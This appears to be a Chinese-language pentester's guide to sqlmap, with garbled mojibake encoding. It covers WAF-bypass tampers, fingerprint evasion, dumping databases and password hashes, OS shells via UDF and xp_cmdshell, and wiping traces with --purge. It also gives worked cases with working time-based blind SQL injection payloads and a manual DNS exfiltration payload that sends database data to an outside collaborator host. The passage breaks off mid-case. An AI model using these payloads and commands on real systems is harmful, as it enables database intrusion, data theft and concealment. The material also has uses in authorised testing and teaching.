### ç›®å½•

- [ç®€ä»‹](#ç®€ä»‹)
- [å‚æ•°è®²è§£](#å‚æ•°è®²è§£)
  - [å¸¸ç”¨å‚æ•° - tamperè¯¦è§£](#å¸¸ç”¨å‚æ•°---tamperè¯¦è§£)
  - [å¸¸ç”¨å‚æ•° - å¼ºåˆ¶ssl](#å¸¸ç”¨å‚æ•°---å¼ºåˆ¶ssl)
  - [å¸¸ç”¨å‚æ•° - åŠ å¿«é€Ÿåº¦ - æŒ‡å®šæœ€å¤§å¹¶å‘requestsæ•°é‡](#å¸¸ç”¨å‚æ•°---åŠ å¿«é€Ÿåº¦---æŒ‡å®šæœ€å¤§å¹¶å‘requestsæ•°é‡)
  - [å¸¸ç”¨å‚æ•° - åŠ å¿«é€Ÿåº¦ - æŒ‡å®šæ•°æ®åº“ç±»å‹](#å¸¸ç”¨å‚æ•°---åŠ å¿«é€Ÿåº¦---æŒ‡å®šæ•°æ®åº“ç±»å‹)
  - [å¸¸ç”¨å‚æ•° - åŠ å¿«é€Ÿåº¦ - æŒ‡å®šæ³¨å…¥ç±»å‹](#å¸¸ç”¨å‚æ•°---åŠ å¿«é€Ÿåº¦---æŒ‡å®šæ³¨å…¥ç±»å‹)
  - [å¸¸ç”¨å‚æ•° - åŠ å¿«é€Ÿåº¦ - æŒ‡å®šç›²æ³¨æ—¶æµ‹è¯•å“ªäº›å­—ç¬¦](#å¸¸ç”¨å‚æ•°---åŠ å¿«é€Ÿåº¦---æŒ‡å®šç›²æ³¨æ—¶æµ‹è¯•å“ªäº›å­—ç¬¦)
  - [å¸¸ç”¨å‚æ•° - é™ä½é€Ÿåº¦ - delay](#å¸¸ç”¨å‚æ•°---é™ä½é€Ÿåº¦---delay)
  - [å¸¸ç”¨å‚æ•° - è®¾ç½®proxyä»£ç†æµé‡](#å¸¸ç”¨å‚æ•°---è®¾ç½®proxyä»£ç†æµé‡)
  - [å¸¸ç”¨å‚æ•° - è®¾ç½®user-agenté¿å…æŒ‡çº¹](#å¸¸ç”¨å‚æ•°---è®¾ç½®user-agenté¿å…æŒ‡çº¹)
  - [å¸¸ç”¨å‚æ•° - è¯»å–HTTP requestæ–‡æœ¬](#å¸¸ç”¨å‚æ•°---è¯»å–http-requestæ–‡æœ¬)
  - [å¸¸ç”¨å‚æ•° - çˆ¬å–](#å¸¸ç”¨å‚æ•°---çˆ¬å–)
  - [å¸¸ç”¨å‚æ•° - ç”¨*æ ‡è®°æ³¨å…¥ç‚¹](#å¸¸ç”¨å‚æ•°---ç”¨æ ‡è®°æ³¨å…¥ç‚¹)
  - [å¸¸ç”¨å‚æ•° - åˆ é™¤sessionæ–‡ä»¶](#å¸¸ç”¨å‚æ•°---åˆ é™¤sessionæ–‡ä»¶)
  - [å¸¸ç”¨å‚æ•° - payloadå‰ç¼€ä¸åç¼€](#å¸¸ç”¨å‚æ•°---payloadå‰ç¼€ä¸åç¼€)
  - [å¸¸ç”¨å‚æ•° - åŸºæœ¬ä¿¡æ¯è·å–](#å¸¸ç”¨å‚æ•°---åŸºæœ¬ä¿¡æ¯è·å–)
  - [å‚æ•° - äº¤äº’å¼sqlè¯­å¥æ‰§è¡Œ](#å‚æ•°---äº¤äº’å¼sqlè¯­å¥æ‰§è¡Œ)
  - [å‚æ•° - OSå‘½ä»¤æ‰§è¡Œ](#å‚æ•°---oså‘½ä»¤æ‰§è¡Œ)
  - [å‚æ•° - ç—•è¿¹æ¸…ç†](#å‚æ•°---ç—•è¿¹æ¸…ç†)
- [æ¡ˆä¾‹1 - MySQL - åŸºäºæ—¶é—´çš„ç›²æ³¨ è¦ç”¨DNSæ‰èƒ½å¿«é€Ÿè·å–æ•°æ®](#æ¡ˆä¾‹1---mysql---åŸºäºæ—¶é—´çš„ç›²æ³¨-è¦ç”¨dnsæ‰èƒ½å¿«é€Ÿè·å–æ•°æ®)
- [æ¡ˆä¾‹2 MySQL - UNION query](#æ¡ˆä¾‹2-mysql---union-query)
- [åˆ©ç”¨MySQLæ•°æ®åº“çš„UDFå‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤](#åˆ©ç”¨mysqlæ•°æ®åº“çš„udfå‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤)
- [Usage](#usage)


### ç®€ä»‹

|åç§°|æè¿°|
|:-------------:|--|
|[sqlmap](https://github.com/sqlmapproject/sqlmap)| Automatic SQL injection and database takeover tool|


* èµ„æ–™
  * [Usage Â· sqlmapproject/sqlmap Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
  * sqlmapç›¸å…³ä»£ç å®ç°å‚è€ƒçš„ç™½çš®ä¹¦(2009å¹´) [Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf](https://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf)

### å‚æ•°è®²è§£

#### å¸¸ç”¨å‚æ•° - tamperè¯¦è§£

tampersæ˜¯sqlmapè‡ªå¸¦çš„ç»•è¿‡WAFçš„è„šæœ¬ï¼Œå¯æŸ¥çœ‹æ‰€æœ‰tampers:

`python sqlmap.py --list-tampers`

2019.2.15 æˆ‘æ›´æ–°å¹¶æ€»ç»“äº† [tamperè„šæœ¬åˆ†ç±»æ±‡æ€» sqlmap_tamper.csv](files/sqlmap_tamper.csv) 

å¯æ ¹æ® è¢«æ‹¦æˆªåŸå›  æ•°æ®åº“ç±»å‹ ç­‰. é€‰æ‹©åˆé€‚çš„tamper(æˆ–è‡ªå†™è„šæœ¬)å®ç°ç»•è¿‡WAF.

å®˜æ–¹æ–‡æ¡£ [sqlmap Wiki - å‚æ•°åŠŸèƒ½çš„è§£é‡Š](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

#### å¸¸ç”¨å‚æ•° - å¼ºåˆ¶ssl

å¼ºåˆ¶ä½¿ç”¨sslåè®® `--force-ssl`

é€‚ç”¨åœºæ™¯:
å¾…æµ‹ç½‘ç«™é€šå¸¸æ˜¯httpsåè®®,ä½†å¯èƒ½è¢«sqlmapè¯†åˆ«ä¸ºhttpåè®®å¹¶å‡ºç°æŠ¥é”™ 404`[CRITICAL] page not found (404)`

>å¦ä¸€ç§ä¸å¤ªé€šç”¨çš„åŠæ³•:æ‰‹å·¥ä¿®æ”¹è¯·æ±‚
>æŠŠHostå¤´æœ€ååŠ ä¸Š`:443`å¯è¢«sqlmapè¯†åˆ«ä¸ºsslåè®®,è¿™ç§åŠæ³•ä¸€èˆ¬å¯è¡Œä½†æœ‰å±€é™æ€§. å®æµ‹ä¸­æœ‰8443ç«¯å£çš„SSLç«¯å£ï¼Œå¦‚æœåœ¨Hostå¤´æœ€ååŠ ä¸Š`:8443`ï¼Œä»ç„¶ä¼šè¢«sqlmapå½“ä½œHTTPåè®®çš„ç«¯å£


#### å¸¸ç”¨å‚æ•° - åŠ å¿«é€Ÿåº¦ - æŒ‡å®šæœ€å¤§å¹¶å‘requestsæ•°é‡

```
--threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
```

è®¾ç½®æœ€å¤§å¹¶å‘è¯·æ±‚æ•°é‡. é»˜è®¤ä¸º1

ä½¿ç”¨å¹¶å‘è¯·æ±‚é€‚ç”¨äºå¤šæ•°æƒ…å†µ. åˆ©ç”¨"åŸºäºæ—¶é—´çš„æ³¨å…¥"è·å–æ•°æ®æ—¶ä¾ç„¶ä¸ä¼šä½¿ç”¨å¹¶å‘è¯·æ±‚.

#### å¸¸ç”¨å‚æ•° - åŠ å¿«é€Ÿåº¦ - æŒ‡å®šæ•°æ®åº“ç±»å‹

æŒ‡å®šæ•°æ®åº“ç±»å‹
```
--dbms Oracle
--dbms MySQL
--dbms "Microsoft Access"
```

#### å¸¸ç”¨å‚æ•° - åŠ å¿«é€Ÿåº¦ - æŒ‡å®šæ³¨å…¥ç±»å‹

```
--tech U
--technique T
```

```
B: Boolean-based blind
E: Error-based
U: Union query-based
S: Stacked queries
T: Time-based blind
Q: Inline queries
```

#### å¸¸ç”¨å‚æ•° - åŠ å¿«é€Ÿåº¦ - æŒ‡å®šç›²æ³¨æ—¶æµ‹è¯•å“ªäº›å­—ç¬¦

```
--charset="0123456789abcdef"
```

é€‚ç”¨ç±»å‹: boolean-based blind SQL injection æˆ– time-based blind SQL injection

æè¿°:åœ¨åŸºäºå¸ƒå°”çš„ç›²SQLæ³¨å…¥,æˆ–åŸºäºæ—¶é—´çš„ç›²SQLæ³¨å…¥ä¸­,ç”¨æˆ·å¯ä»¥å¼ºåˆ¶ä½¿ç”¨è‡ªå®šä¹‰å­—ç¬¦é›†æ¥åŠ é€Ÿæ•°æ®è·å–è¿‡ç¨‹.

ä¾‹å¦‚,å¦‚æœdumpçš„æ•°æ®æ˜¯"ä¿¡æ¯æ‘˜è¦"(message digest) MD5,SHA1ç­‰,ä½¿ç”¨`--charset="0123456789abcdef"`çš„è¯·æ±‚æ•°é‡ ä»…ä¸ºæ­£å¸¸è¿è¡Œæ—¶è¯·æ±‚æ•°é‡çš„70%

#### å¸¸ç”¨å‚æ•° - é™ä½é€Ÿåº¦ - delay

è®¾ç½®æ¯ä¸¤æ¬¡HTTP(S)requestä¹‹é—´çš„æ—¶é—´é—´éš”. ä»¥ç§’ä¸ºå•ä½. floatç±»å‹.

```
--delay 0.5
```

é»˜è®¤ä¸º0

#### å¸¸ç”¨å‚æ•° - è®¾ç½®proxyä»£ç†æµé‡

æ ¼å¼ä¸ºï¼š`(http|https|socks4|socks5)://address:port`

å¦‚
```
--proxy=socks5://127.0.0.1:1080
```

#### å¸¸ç”¨å‚æ•° - è®¾ç½®user-agenté¿å…æŒ‡çº¹

æŒ‡å®šuser-agent (éšæœºUA)
```
--random-agent
```

æŒ‡å®šuser-agent (ç§»åŠ¨è®¾å¤‡UA)
```
--mobile

which smartphone do you want sqlmap to imitate through HTTP User-Agent header?
[1] Apple iPhone 8 (default)
[2] BlackBerry Z10
[3] Google Nexus 7
[4] Google Pixel
[5] HP iPAQ 6365
[6] HTC 10
[7] Huawei P8
[8] Microsoft Lumia 950
[9] Nokia N97
[10] Samsung Galaxy S7
[11] Xiaomi Mi 3
```

æŒ‡å®šuser-agent (ä»»æ„UA)
```
--user-agent "Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
```

#### å¸¸ç”¨å‚æ•° - è¯»å–HTTP requestæ–‡æœ¬

sqlmap `-r reqfile.txt` ä¼šè‡ªåŠ¨åˆ†æè¯¥è¯·æ±‚åŒ…ï¼ˆå¦‚cookieï¼ŒPOSTæ•°æ® ç­‰ï¼‰ï¼Œå¯å……åˆ†æµ‹è¯•å„å¤„ï¼Œé¿å…ç”¨å‘½ä»¤è¡Œè®¾ç½®User-Agentç­‰å‚æ•°

`reqfile.txt`çš„æ ¼å¼ï¼š
```
POST /vuln.php HTTP/1.1
Host: www.target.com
User-Agent: Mozilla/4.0

id=1
```

#### å¸¸ç”¨å‚æ•° - çˆ¬å–

```
--crawl=3
```
è®¾ç½®çˆ¬å–æ·±åº¦.

```
req1.txtä¸­çš„URLä¸º:
http://192.168.0.1/web/

python sqlmap.py -r req1.txt --batch --crawl=3
[...]
[xx:xx:53] [INFO] starting crawler
[xx:xx:53] [INFO] searching for links with depth 1
[xx:xx:53] [WARNING] running in a single-thread mode. This could take a while
[xx:xx:53] [INFO] searching for links with depth 2
[xx:xx:54] [INFO] heuristics detected web page charset 'ascii'
[xx:xx:00] [INFO] 42/56 links visited (75%)
[...]
```

#### å¸¸ç”¨å‚æ•° - ç”¨*æ ‡è®°æ³¨å…¥ç‚¹

é’ˆå¯¹æƒ…å†µï¼šä¼ªé™æ€ ç­‰sqlmapä¸èƒ½è‡ªåŠ¨è¯†åˆ«çš„æ ¼å¼

```
python sqlmap.py -u xxx.com/index.php/Index/view/id/40*.html --dbs
```

-r ä¹Ÿæ˜¯åœ¨è¯·æ±‚åŒ…æ–‡ä»¶ä¸­çš„å‚æ•°å€¼åé¢åŠ *å·


#### å¸¸ç”¨å‚æ•° - åˆ é™¤sessionæ–‡ä»¶

```
--flush-session
```

åœ¨ä¸€æ¬¡æˆåŠŸè·å–æ•°æ®å,æƒ³å†æ¬¡è·å–æœ€æ–°çš„æ•°æ®,å°±å¯ä»¥ç”¨è¿™ä¸ªå‚æ•°.

æç¤º:ä»…ä¼šåœ¨æ•°æ®æ–‡ä»¶å¤¹ä¸­åˆ é™¤ è¿™ä¸ªæ–‡ä»¶å¤¹ /xx.com/ ä¸­çš„å‡ ä¹æ‰€æœ‰ä¿¡æ¯,é™¤äº†å·²ç»è·å–å¹¶ä¿å­˜ä¸º`results-xxxx.csv`çš„æ–‡ä»¶,å®ƒä»¬ä¼šè¢«é‡å‘½åä¸º`results-xxxx.csv1`


#### å¸¸ç”¨å‚æ•° - payloadå‰ç¼€ä¸åç¼€

æŸä¸ªç½‘ç«™ç™»å½•å¤„,æ‰‹å·¥æµ‹è¯•å­˜åœ¨SQLæ³¨å…¥,ä½†sqlmapé»˜è®¤æ— æ³•å‘ç°æ¼æ´.

åªæœ‰æ ¹æ®æ‰‹å·¥æµ‹è¯•ç»“æœ(è§Payload),ä½¿ç”¨å‚æ•° `--prefix` å’Œ `--suffix` ç»™PayloadåŠ ä¸Šå‰ç¼€å’Œåç¼€,æ‰èƒ½è®©sqlmapå‘ç°SQLæ³¨å…¥æ¼æ´,ä¾¿äºè¿›è¡Œè‡ªåŠ¨åŒ–.

```
python sqlmap.py -r req1.txt --random-agent --dbms=mysql --time-sec 10 -p username -v3 --tech=T --prefix="'" --suffix="--'"  --tamper=between --dbs

---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 5105 FROM (SELECT(SLEEP(10)))txIo)--'
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
```


#### å¸¸ç”¨å‚æ•° - åŸºæœ¬ä¿¡æ¯è·å–

```shell

# ------------

# è·å–ç›®æ ‡ä¸»æœºçš„hostname
--hostname

# ------------

# è·å–å½“å‰"æ•°æ®åº“"çš„åç§°
--current-db

# è·å–å½“å‰ä½¿ç”¨çš„"æ•°æ®åº“ç”¨æˆ·" ç”¨æˆ·å
--current-user

# åˆ¤æ–­å½“å‰"æ•°æ®åº“ç”¨æˆ·"æ˜¯å¦ä¸ºDBA
--is-dba

# è·å–å…¨éƒ¨"æ•°æ®åº“"çš„åç§°
--dbs

# è·å–å‡ ä¹å…¨éƒ¨"æ•°æ®åº“"çš„åç§°,å…¨éƒ¨è¡¨çš„åç§°,å…¨éƒ¨å­—æ®µ "å­—æ®µå" "å­—æ®µç±»å‹". æ’é™¤"ç³»ç»Ÿæ•°æ®åº“"
--schema --exclude-sysdbs

# è·å–å…¨éƒ¨"æ•°æ®åº“ç”¨æˆ·"
--users

# è·å–å…¨éƒ¨"æ•°æ®åº“ç”¨æˆ·" åŠå…¶å£ä»¤
--passwords

# è·å–å…¨éƒ¨"æ•°æ®åº“ç”¨æˆ·" åŠå…¶æƒé™(æ˜¯å¦ä¸ºDBA)
--privileges


# è·å–æŒ‡å®šæ•°æ®åº“å†…çš„æ¯ä¸ªè¡¨ æœ‰å¤šå°‘æ¡è®°å½•
--count -D testdb

[...]
Database: testdb
+----------------+---------+
| Table          | Entries |
+----------------+---------+
| dbo.users      | 4       |
| dbo.users_blob | 2       |
+----------------+---------+

# ------------

# è·å–è¡¨å - è·å–æŒ‡å®šã€éƒ¨åˆ†ã€å…¨éƒ¨"æ•°æ®åº“"çš„æ‰€æœ‰è¡¨çš„åç§°

# è·å–å…¨éƒ¨æ•°æ®åº“çš„è¡¨
--tables

# è·å–å‡ ä¹å…¨éƒ¨æ•°æ®åº“çš„è¡¨. æ’é™¤"ç³»ç»Ÿæ•°æ®åº“"
--tables --exclude-sysdbs

# è·å–æŒ‡å®šæ•°æ®åº“çš„è¡¨
--tables -D users

# ------------

# è·å–å­—æ®µå - è·å–æŒ‡å®šã€éƒ¨åˆ†ã€å…¨éƒ¨"æ•°æ®åº“"ã€"è¡¨"çš„æ‰€æœ‰å­—æ®µçš„åç§°

# è·å–æŒ‡å®šæ•°æ®åº“(ä¸ç”¨-Dåˆ™é»˜è®¤å½“å‰æ•°æ®åº“)ã€æŒ‡å®šè¡¨çš„å…¨éƒ¨å­—æ®µ "å­—æ®µå" "å­—æ®µç±»å‹"
--columns -D testdb -T users -C name

# ------------

# è·å–æ•°æ® - è·å– æŒ‡å®š"æ•°æ®åº“" çš„å…¨éƒ¨æ•°æ®
--dump -D testdb

# è·å–æ•°æ® - è·å– æŒ‡å®š"è¡¨" çš„å…¨éƒ¨æ•°æ®
--dump -T users

# è·å–æ•°æ® - è·å– æŒ‡å®š"è¡¨" çš„æŒ‡å®šæ•°æ®
--dump -T users -C last_ip,last_time


# è·å–æ•°æ® - è·å– å‡ ä¹å…¨éƒ¨æ•°æ®. æ’é™¤"ç³»ç»Ÿæ•°æ®åº“"
#ã€è¯·æ±‚å¤š è€—æ—¶å¤šã€‘
--dump-all --exclude-sysdbs
```

#### å‚æ•° - äº¤äº’å¼sqlè¯­å¥æ‰§è¡Œ

```
--sql-shell
```

* å¸¸ç”¨è¯­å¥
  * [MySQLå¸¸ç”¨çš„æŸ¥è¯¢è¯­å¥](web_vul_SQLi.md#mysqlå¸¸ç”¨çš„æŸ¥è¯¢è¯­å¥)
  * [MySQLå¸¸ç”¨çš„getshellæ–¹æ³•](web_vul_SQLi.md#mysqlå¸¸ç”¨çš„getshellæ–¹æ³•)

#### å‚æ•° - OSå‘½ä»¤æ‰§è¡Œ

å‰æ1ï¼šæ•°æ®åº“æ”¯æŒç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ. å¦‚MySQL/PostgreSQL/Microsoft SQL Serverç­‰

å‰æ2ï¼šå½“å‰ç”¨æˆ·æœ‰æƒé™ä½¿ç”¨ç‰¹å®šçš„å‡½æ•°. åœ¨sqlmapä¸­æŸ¥çœ‹æƒé™ç”¨ `--privilege`


```
# æ‰§è¡ŒæŒ‡å®šç³»ç»Ÿå‘½ä»¤  --os-cmd=whoami
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "MySQL" --os-cmd=whoami 
```

```
# è·å¾—äº¤äº’å¼shell  --os-shell
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "MySQL" --os-shell
```

* è·å–ç³»ç»Ÿshell - é€šè¿‡æ•°æ®åº“ - MySQL [å®æˆ˜-åˆ©ç”¨mysqlæ•°æ®åº“çš„udfå‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤](#åˆ©ç”¨mysqlæ•°æ®åº“çš„udfå‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤)
    * å‰ææ¡ä»¶:æ•°æ®åº“è¿›ç¨‹(DBMS process)å¯¹ç›®æ ‡æ–‡ä»¶å¤¹å…·æœ‰æ–‡ä»¶è¯»å–ã€å†™å…¥æƒé™.
    * å®ç°åŸç†:ä¸Šä¼ ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ å…±äº«åº“(shared library)åˆ°å¯¹åº”æ–‡ä»¶å¤¹ï¼Œå®ƒåŒ…å«ä¸¤ä¸ªç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°(user-defined functions,UDF)ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°,å…¶ä¸­æœ‰2ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤. ç„¶ååœ¨æ•°æ®åº“ä½¿ç”¨SQLè¯­å¥ åˆ›å»ºè¯¥å‡½æ•° å¹¶è°ƒç”¨è¯¥å‡½æ•° å³å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤.
      * `sys_eval()` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ è¿”å›æ ‡å‡†è¾“å‡º
      * `sys_exec()` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ è¿”å›é€€å‡ºç 


* è·å–ç³»ç»Ÿshell - é€šè¿‡æ•°æ®åº“ - Mcrosoft SQL Server
    * å‰ææ¡ä»¶:`xp_cmdshell`æ‰©å±•å­˜å‚¨è¿‡ç¨‹è¿™ä¸€é…ç½®å¤„äºå¼€å¯çŠ¶æ€ï¼Œæˆ–è€…å¯ä»¥è¢«å¼€å¯
    * åˆ©ç”¨è¿‡ç¨‹:ä½¿ç”¨`xp_cmdshell`æ‰©å±•å­˜å‚¨è¿‡ç¨‹(extended stored procedure)ï¼Œå®ƒæ˜¯SQL Serverçš„ä¸€ä¸ªé…ç½®é¡¹ï¼Œå¯ç”¨æ—¶èƒ½è®©SQL Serverè´¦å·æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼Œè¿”å›æ–‡æœ¬è¡Œ
      * å¦‚æœ`xp_cmdshell`å­˜å‚¨è¿‡ç¨‹ è¢«ç¦ç”¨(Microsoft SQL Server >= 2005 é»˜è®¤ç¦ç”¨)sqlmapä¼šé‡æ–°å¯ç”¨å®ƒ
      * å¦‚æœ`xp_cmdshell`å­˜å‚¨è¿‡ç¨‹ ä¸å­˜åœ¨ åˆ™ä»å¤´å¼€å§‹åˆ›å»ºå®ƒ



#### å‚æ•° - ç—•è¿¹æ¸…ç†

```
--purge
```

å®‰å…¨åˆ é™¤ æ•°æ®æ–‡ä»¶å¤¹`$HOME/.local/share/sqlmap`ä¸‹æ‰€æœ‰è·å–åˆ°çš„æ•°æ®.
 
æ•°æ®æ–‡ä»¶å¤¹ (å­)ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å°†è¢«éšæœºæ•°æ®è¦†ç›–.æ–‡ä»¶åä¹Ÿä¼šéšæœºè¦†ç›–.

```
python sqlmap.py --purge -v 3
[...]
[xx:xx:55] [INFO] purging content of directory '/home/testuser/.local/share/sqlmap'...
[xx:xx:55] [DEBUG] changing file attributes
[xx:xx:55] [DEBUG] writing random data to files
[xx:xx:55] [DEBUG] truncating files
[xx:xx:55] [DEBUG] renaming filenames to random values
[xx:xx:55] [DEBUG] renaming directory names to random values
[xx:xx:55] [DEBUG] deleting the whole directory tree
[...]
```

### æ¡ˆä¾‹1 - MySQL - åŸºäºæ—¶é—´çš„ç›²æ³¨ è¦ç”¨DNSæ‰èƒ½å¿«é€Ÿè·å–æ•°æ®

* åœºæ™¯ - windowsæœåŠ¡å™¨çš„webåº”ç”¨ å‚æ•°id å­˜åœ¨ MySQL SQLi ç±»å‹ä¸º`åŸºäºæ—¶é—´çš„ç›²æ³¨` å¦‚ä½•å¿«é€Ÿè·å–æ•°æ®? 
  * æ“ä½œç³»ç»Ÿ:windows
  * æ•°æ®åº“ç±»å‹:MySQL
  * SQLiç±»å‹:**åŸºäºæ—¶é—´çš„ç›²æ³¨**  (å˜æ¢æ€è·¯ æ€è€ƒå…¶ä»–æ•°æ®å¤–ä¼ çš„åŠæ³•!!)

åŸç†å‚è€ƒ[ç±»å‹6 - "å¸¦å¤–"(out-of-band)](web_vul_sqli.md#ç±»å‹6---å¸¦å¤–out-of-band)

ã€å®é™…æµ‹è¯•ã€‘è·å–æ•°æ®-è‡ªåŠ¨åŒ–
```
# å¯¹æ¯”è¿™2ä¸ªæ–¹æ³•
ã€æ–¹æ³•1ã€‘
# åŸºäºæ—¶é—´çš„ç›²æ³¨ - æ‹¿æ•°æ®æ–¹æ³•1: æ ¹æ®å»¶æ—¶æ¥è·‘æ•°æ® (å¾ˆæ…¢!!!)
python sqlmap.py -u "http://vul.com/user.php?id=1" -p id --tech=T --dbms mysql --dbs

ã€æ–¹æ³•2ã€‘
# åŸºäºæ—¶é—´çš„ç›²æ³¨ - æ‹¿æ•°æ®æ–¹æ³•2: ä½¿ç”¨å¸¦å¤–è¯·æ±‚(OOB) åˆ©ç”¨ DNS exfiltrationè·‘æ•°æ®.  å¾ˆå¿«!!!!!!!!
# æ³¨æ„:
# YOUR.com çš„IPä¸º 114.1.1.1  ä¸”è®¾ç½®äº†DNS Host ä¹Ÿå°±æ˜¯æŠŠæ‰€æœ‰å°è¯•è§£æYOUR.comçš„é‚£äº›DNSè¯·æ±‚ éƒ½å‘é€åˆ°ns1.YOUR.comçš„53å·UDPç«¯å£
# ns1.YOUR.com çš„IPä¸º 114.1.1.1
# åœ¨è¿™å°æœºå™¨ä¸Šè¿è¡Œä»¥ä¸‹sqlmapå‘½ä»¤ æ³¨æ„å‚æ•°--dns-domain ä¼šåœ¨53ç«¯å£å¼€å¯ä¸€ä¸ªDNSæœåŠ¡ä½œä¸ºnsæœåŠ¡å™¨ æ¥æ”¶å¯¹YOUR.comçš„DNSè¯·æ±‚(å¾—åˆ°å…¶ä¸­æºå¸¦çš„æ•°æ®)
python sqlmap.py -u "http://vul.com/user.php?id=1" -p id --dbms mysql --dbs --dns-domain=YOUR.com
[07:25:21] [INFO] testing for data retrieval through DNS channel
```



ã€å®é™…æµ‹è¯•ã€‘å¸¦å¤–è·å–æ•°æ®-æ‰‹å·¥è¿›è¡Œçš„å…·ä½“è¿‡ç¨‹
```
# æ‰‹å·¥åˆ©ç”¨ç¬¬0æ­¥ ğŸŒ¹ç¡®è®¤SQLiæ˜¯å¦å­˜åœ¨

# idå‚æ•°çš„å€¼ä¸º
1234' AND (SELECT 9905 FROM (SELECT(SLEEP(5)))vMZe) AND 'fACM'='fACM

# å®é™…HTTPè¯·æ±‚çš„ç¬¬1è¡Œ å†…å®¹å¦‚ä¸‹ å…¶ä¸­idå‚æ•°çš„å€¼åšäº†ç¼–ç  JavaScript encodeURIComponent()
/user.php?id=1234'%20AND%20(SELECT%209905%20FROM%20(SELECT(SLEEP(5)))vMZe)%20AND%20'fACM'%3D'fACM HTTP/1.1

# å»¶æ—¶äº†5ç§’å¤š æ‰€ä»¥ç¡®è®¤å­˜åœ¨SQLi.
# Type: time-based blind
# Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

-----

# æ‰‹å·¥åˆ©ç”¨ç¬¬1æ­¥ ğŸŒ¹æµ‹è¯• æ”»å‡»è€…çš„dnsæœåŠ¡å™¨ èƒ½å¦æ”¶åˆ°æ•°æ®
# idå‚æ•°çš„å€¼ä¸º
1234'+(select load_file('\\\\easv5rqjxp4jbbk5t8vlqnn5iwoocd.burpcollaborator.net\\anq'))+' 

# å®é™…HTTPè¯·æ±‚çš„ç¬¬1è¡Œ å†…å®¹å¦‚ä¸‹ å…¶ä¸­idå‚æ•°çš„å€¼åšäº†ç¼–ç  JavaScript encodeURIComponent()
/user.php?id=1234'%2b(select%20load_file('%5c%5c%5c%5ceasv5rqjxp4jbbk5t8vlqnn5iwoocd.burpcollaborator.net%5c%5canq'))%2b' HTTP/1.1

# æµ‹è¯•æˆåŠŸ æ”¶åˆ°äº†DNSæ•°æ®.

-----

# æ‰‹å·¥åˆ©ç”¨ç¬¬2æ­¥ ğŸŒ¹è·å–æ•°æ®åº“çš„æ•°æ® å¦‚version()
# idå‚æ•°çš„å€¼ä¸º
1234' AND (SELECT 2026 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT LOAD_FILE(CONCAT(0x5c5c5c5c474c762e,(SELECT HEX(MID((IFNULL(version(),0x20)),1,31))),0x2e5471722e656173763572716a7870346a62626b357438766c716e6e3569776f6f63642e62757270636f6c6c61626f7261746f722e6e65745c5c4c6e6f74))),2,1))>563,0,5)))))Uyjo) AND 'Tbug'='Tbug

# å®é™…HTTPè¯·æ±‚çš„ç¬¬1è¡Œ å†…å®¹å¦‚ä¸‹ å…¶ä¸­idå‚æ•°çš„å€¼åšäº†ç¼–ç  JavaScript encodeURIComponent()
/user.php?id=1234'%20AND%20(SELECT%202026%20FROM%20(SELECT(SLEEP(5-(IF(ORD(MID((SELECT%20LOAD_FILE(CONCAT(0x5c5c5c5c474c762e%2C(SELECT%20HEX(MID((IFNULL(version()%2C0x20))%2C1%2C31)))%2C0x2e5471722e656173763572716a7870346a62626b357438766c716e6e3569776f6f63642e62757270636f6c6c61626f7261746f722e6e65745c5c4c6e6f74)))%2C2%2C1))%3E563%2C0%2C5)))))Uyjo)%20AND%20'Tbug'%3D'Tbug HTTP/1.1


# æ”¶åˆ°äº†DNSæ•°æ®
GLv.352E352E3533.Tqr.easv5rqjxp4jbbk5t8vlqnn5iwoocd.burpcollaborator.net.

å…¶ä¸­`352E352E3533` å°±æ˜¯ç»è¿‡hexç¼–ç çš„æ•°æ®, åšdecodeå³å¯:

Hex to ASCII
5.5.53

Hex to UTF-8
5.5.53

å¾—çŸ¥äº†MySQLçš„ç‰ˆæœ¬ä¸º5.5.53
```


### æ¡ˆä¾‹2 MySQL - UNION query

* åœºæ™¯ - windowsæœåŠ¡å™¨çš„webåº”ç”¨ å‚æ•°id å­˜åœ¨SQLi ç±»å‹ä¸º`UNION query`
  * æ“ä½œç³»ç»Ÿ:æ— å…³
  * æ•°æ®åº“ç±»å‹:MySQL
  * SQLiç±»å‹:`UNION query`


ã€å®é™…æµ‹è¯•ã€‘è·å–æ•°æ®-è‡ªåŠ¨åŒ–
```shell
# æŒ‡å®šæŠ€æœ¯ä¸ºU
python sqlmap.py -r /Users/xxx/Downloads/req.txt --proxy=socks5://127.0.0.1:1081 -p uid --dbms=mysql -p id -v  5 --tech=U --dbs
```

ã€å®é™…æµ‹è¯•ã€‘è·å–æ•°æ®-æ‰‹å·¥çš„å…·ä½“è¿‡ç¨‹
```
